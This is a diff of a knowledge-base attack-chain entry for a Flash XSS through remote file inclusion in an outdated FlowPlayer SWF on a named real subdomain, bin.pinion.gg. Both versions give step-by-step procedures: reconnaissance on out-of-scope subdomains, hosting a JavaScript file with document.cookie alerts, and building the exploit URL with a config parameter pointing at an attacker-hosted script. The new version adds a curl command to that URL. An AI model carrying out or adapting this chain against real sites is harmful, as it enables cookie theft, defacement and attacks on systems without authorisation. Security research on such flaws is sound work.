@@ -1,11 +1,11 @@
 ---
-id: ac-flash-xss-rfi-flowplayer
+id: ac-uuid-flash-xss-rfi
 tags:
   - xss
   - flash
   - rfi
-  - javascript
-  - web
+  - flowplayer
+  - javascript-execution
 type: attack_chain
 tools: []
 tactics:
@@ -14,23 +14,24 @@ tactics:
 verified: false
 platforms:
   - Web
+  - Flash
 submitted: true
 complexity: medium
 created_at: '2023-10-01T00:00:00Z'
 procedures:
-  - '[[procedures/Reconnaissance-on-Target-Subdomains]]'
-  - '[[procedures/Identify-Vulnerable-FlowPlayer-SWF-Reference]]'
-  - '[[procedures/Host-Malicious-JavaScript-Payload]]'
-  - '[[procedures/Exploit-Flash-XSS-via-Remote-File-Inclusion]]'
+  - '[[procedures/Reconnaissance-on-Out-of-Scope-Subdomains]]'
+  - '[[procedures/Identify-Vulnerable-FlowPlayer-SWF]]'
+  - '[[procedures/Host-Malicious-JavaScript-File]]'
+  - '[[procedures/Exploit-Flash-XSS-via-Config-Parameter]]'
 step_count: 4
 techniques:
   - '[[Exploit Public-Facing Application]]'
   - '[[JavaScript]]'
-updated_at: '2025-12-14T03:47:18.658Z'
+updated_at: '2025-12-14T17:26:17.695Z'
 description: >-
-  Multi-stage attack exploiting an outdated FlowPlayer SWF file for Flash-based
-  XSS through remote file inclusion, enabling arbitrary JavaScript execution in
-  the subdomain context.
+  Multi-stage attack exploiting an outdated Flash-based FlowPlayer SWF file
+  vulnerable to remote file inclusion, leading to arbitrary JavaScript execution
+  on a subdomain.
 skill_level: intermediate
 impact_level: high
 validated: true
@@ -43,7 +44,7 @@ mitre_techniques:
 ---
 # Flash XSS via Remote File Inclusion in Outdated FlowPlayer SWF
 
-Multi-stage attack chain demonstrating exploitation of a Flash-based XSS vulnerability in an outdated FlowPlayer SWF file (version 3.2.15), allowing remote file inclusion (RFI) via the 'config' parameter. This leads to arbitrary JavaScript execution in the context of the bin.pinion.gg subdomain, potentially enabling defacement, open redirects, cross-domain cookie setting, and persistent XSS if embedded elsewhere. The attack begins with reconnaissance on outscope subdomains, identifies the vulnerable asset through a cache manifest, hosts a malicious payload, and triggers execution by modifying the SWF URL.
+Multi-stage attack chain demonstrating exploitation of a Flash-based XSS vulnerability in an outdated FlowPlayer SWF file (version 3.2.15), allowing remote file inclusion of arbitrary JavaScript for execution in the subdomain's context. Discovered via reconnaissance on out-of-scope subdomains, the attack involves identifying the vulnerable SWF, hosting malicious JS, and triggering execution via a manipulated config parameter. Impact includes page defacement, open redirects, cross-domain cookie manipulation, or stored XSS if embedded elsewhere.
 
 ## Chain Metrics Dashboard
 
@@ -51,7 +52,7 @@ Multi-stage attack chain demonstrating exploitation of a Flash-based XSS vulnera
 |--------|-------|
 | Chain Status | Unverified |
 | Total Steps | 4 |
-| Execution Time | ~10 minutes |
+| Execution Time | ~5 minutes |
 | Skill Level | Intermediate |
 | Complexity | Medium |
 | Impact Level | High |
@@ -62,7 +63,7 @@ Multi-stage attack chain demonstrating exploitation of a Flash-based XSS vulnera
 graph LR
     A[Reconnaissance on Subdomains] --> B[Identify Vulnerable SWF]
     B --> C[Host Malicious JS]
-    C --> D[Exploit RFI for XSS]
+    C --> D[Exploit via Config Parameter]
     D --> E[Arbitrary JS Execution]
 
     style A fill:#e74c3c
@@ -76,84 +77,89 @@ graph LR
 
 ### Required Tools
 
-- Web browser for manual inspection
-- Web server to host malicious JS (e.g., Apache or Python SimpleHTTPServer)
+- Web browser (e.g., Chrome with Flash enabled for testing)
+- Remote hosting service (e.g., GitHub Pages or personal server)
 
 ### Target Environment
 
-- Web platform with embedded Flash content
-- Outdated FlowPlayer SWF (version 3.2.15 or similar vulnerable versions)
-- Accessible subdomains for reconnaissance
+- Web platform with embedded or accessible Flash SWF files
+- Outdated FlowPlayer version 3.2.15 or similar vulnerable to RFI
+- No specific ports; accessible via HTTP/HTTPS
 
 ### Initial Access Requirements
 
-- No credentials required
-- Public network access to target subdomains
-- Knowledge of subdomain enumeration techniques
+- Public access to target subdomains
+- No credentials needed; reconnaissance-based
+- Ability to host external files
 
 ## Detailed Attack Procedures
 
-### Step 1: Reconnaissance on Target Subdomains
-procedure: [[procedures/Reconnaissance-on-Target-Subdomains]]
+### Step 1: Reconnaissance on Out-of-Scope Subdomains
+procedure: [[procedures/Reconnaissance-on-Out-of-Scope-Subdomains]]
 
-**Objective**: Identify outscope subdomains to expand the attack surface and locate potential vulnerable assets.
+**Objective**: Discover resources on target subdomains to identify potential vulnerabilities, such as manifest files referencing outdated components.
 
-**Instructions**: Manually enumerate and examine subdomains of the target domain, such as *.pinion.gg, focusing on assets like cache manifests or embedded media files. Use browser developer tools or direct URL access to inspect files.
+**Instructions**: Manually browse or use web tools to examine subdomains of the target domain (e.g., pinion.gg). Focus on out-of-scope assets like templ4d2.pinion.gg. Download and inspect manifest files for embedded resources.
 
-**Expected Output**: List of subdomains and referenced files, e.g., templ4d2.pinion.gg/motd2.manifest.
-
-**Success Indicators**:
-- Subdomains like templ4d2.pinion.gg discovered
-- Interesting files (e.g., manifest files) identified for further inspection
-
-### Step 2: Identify Vulnerable FlowPlayer SWF Reference
-procedure: [[procedures/Identify-Vulnerable-FlowPlayer-SWF-Reference]]
-
-**Objective**: Locate references to outdated and vulnerable SWF files that can be exploited for XSS.
-
-**Instructions**: Access the identified cache manifest file, such as http://templ4d2.pinion.gg/motd2.manifest, and parse its contents to find references to SWF files. Verify the version against known vulnerabilities (e.g., FlowPlayer 3.2.15 is susceptible to Flash XSS via ExternalInterface.Call).
-
-**Expected Output**: URL of the vulnerable SWF, e.g., http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf.
+**Expected Output**: Identification of files like motd2.manifest listing SWF resources.
 
 **Success Indicators**:
-- SWF file reference found in manifest
-- Version confirmed as vulnerable (3.2.15)
+- Manifest file accessed and parsed
+- References to SWF files noted
 
-### Step 3: Host Malicious JavaScript Payload
-procedure: [[procedures/Host-Malicious-JavaScript-Payload]]
+### Step 2: Identify Vulnerable FlowPlayer SWF
+procedure: [[procedures/Identify-Vulnerable-FlowPlayer-SWF]]
 
-**Objective**: Prepare a remote JavaScript file containing payloads to execute arbitrary code upon inclusion.
+**Objective**: Confirm the presence and version of an outdated FlowPlayer SWF known to be vulnerable to XSS via remote file inclusion.
 
-**Instructions**: Create a JavaScript file (e.g., test.js) with test payloads like `alert(document.cookie);` and `alert(document.domain);`. Host it on a controllable remote server, ensuring it's publicly accessible via HTTP.
+**Instructions**: Access the SWF URL from the manifest (e.g., http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf). Check version details through file properties or known vulnerability databases. Cross-reference with reports on GitHub or CVE for RFI issues in version 3.2.15.
 
-**Expected Output**: Accessible URL for the malicious JS, e.g., http://[redacted]/test.js.
-
-**Success Indicators**:
-- JS file hosted and verifiable via browser
-- Payloads confirm execution context (cookies, domain)
-
-### Step 4: Exploit Flash XSS via Remote File Inclusion
-procedure: [[procedures/Exploit-Flash-XSS-via-Remote-File-Inclusion]]
-
-**Objective**: Trigger the RFI vulnerability to load and execute the malicious JS in the target's subdomain context.
-
-**Instructions**: Append the 'config' parameter to the vulnerable SWF URL, pointing to the hosted malicious JS. Access the modified URL in a browser supporting Flash.
-
-**Expected Output**: Popups or alerts displaying document.cookie and document.domain, confirming JS execution in bin.pinion.gg context.
+**Expected Output**: Confirmation of version 3.2.15 and vulnerability to config parameter manipulation.
 
 **Success Indicators**:
-- Arbitrary JS executes without errors
-- Domain and cookie access demonstrated
-- Potential for further impacts like defacement or redirects
+- SWF version verified as vulnerable
+- RFI via 'config' parameter documented
+
+### Step 3: Host Malicious JavaScript File
+procedure: [[procedures/Host-Malicious-JavaScript-File]]
+
+**Objective**: Prepare a remote JavaScript file containing XSS payloads to be loaded by the vulnerable SWF.
+
+**Instructions**: Create a file named test.js with payloads like `alert(document.cookie);` and `alert(document.domain);`. Upload to a publicly accessible server (e.g., http://[redacted]/test.js). Ensure the file executes on load.
+
+**Expected Output**: JS file hosted and accessible via direct URL.
+
+**Success Indicators**:
+- File loads without errors
+- Payloads ready for inclusion
+
+### Step 4: Exploit Flash XSS via Config Parameter
+procedure: [[procedures/Exploit-Flash-XSS-via-Config-Parameter]]
+
+**Objective**: Trigger the SWF to load and execute the remote malicious JS, achieving arbitrary code execution in the subdomain context.
+
+**Instructions**: Construct the exploit URL by appending the malicious JS URL to the config parameter: http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://[redacted]/test.js. Access the URL in a browser with Flash support to load the SWF and execute the JS.
+
+Use [[commands/access-vulnerable-swf-url]] for verification:
+
+```bash
+curl "http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://[redacted]/test.js" -v
+```
+
+**Expected Output**: SWF loads, remote JS executes, popups display cookie and domain info.
+
+**Success Indicators**:
+- JavaScript alerts triggered
+- Execution confirmed in subdomain context
 
 ## Attack Chain Summary
 
 ### Key Achievements
 
-1. Discovered vulnerable SWF through subdomain recon and manifest inspection
-2. Hosted and loaded malicious JS via RFI in the 'config' parameter
-3. Achieved arbitrary JS execution, bypassing Flash security for XSS
-4. Highlighted risks of outdated embedded Flash content
+1. Discovered vulnerable SWF through subdomain recon
+2. Hosted and loaded malicious JS remotely
+3. Achieved XSS execution without direct access
+4. Demonstrated potential for defacement or cookie theft
 
 ## Technique & Tactic Coverage
 
@@ -168,5 +174,4 @@ procedure: [[procedures/Exploit-Flash-XSS-via-Remote-File-Inclusion]]
 - [[Execution]] Execution
 
 ---
-
 *Last updated: 2023-10-01T00:00:00Z*
